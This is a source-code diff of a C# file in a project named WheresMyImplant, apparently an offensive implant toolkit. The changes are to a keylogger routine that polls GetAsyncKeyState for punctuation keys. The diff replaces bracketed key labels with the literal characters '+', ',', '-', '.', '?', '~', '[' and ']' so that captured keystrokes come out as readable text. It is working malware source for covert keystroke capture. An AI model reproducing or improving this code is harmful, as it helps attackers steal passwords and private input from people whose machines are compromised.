@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Linq;
 using System.Text;
 using System.Threading;
 
@@ -390,23 +389,23 @@ namespace WheresMyImplant
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem1))
                 returnVal += "\n[:Oem1:]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemplus))
-                returnVal += "\n[:Oemplus:]";
+                returnVal += "+";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemcomma))
-                returnVal += "\n[:Oemcomma:]";
+                returnVal += ",";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemMinus))
-                returnVal += "\n[:OemMinus:]";
+                returnVal += "-";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPeriod))
-                returnVal += "\n[:OemPeriod:]";
+                returnVal += ".";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuestion))
-                returnVal += "\n[:OemQuestion:]";
+                returnVal += "?";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem2))
                 returnVal += "\n[:Oem2:]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemtilde))
-                returnVal += "\n[:Oemtilde:]";
+                returnVal += "~";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem3))
                 returnVal += "\n[:Oem3:]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemOpenBrackets))
-                returnVal += "\n[:OemOpenBrackets:]";
+                returnVal += "[";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem4))
                 returnVal += "\n[:Oem4:]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPipe))
@@ -414,7 +413,7 @@ namespace WheresMyImplant
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem5))
                 returnVal += "\n[:Oem5:]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemCloseBrackets))
-                returnVal += "\n[:OemCloseBrackets:]";
+                returnVal += "]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem6))
                 returnVal += "\n[:Oem6:]";
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuotes))
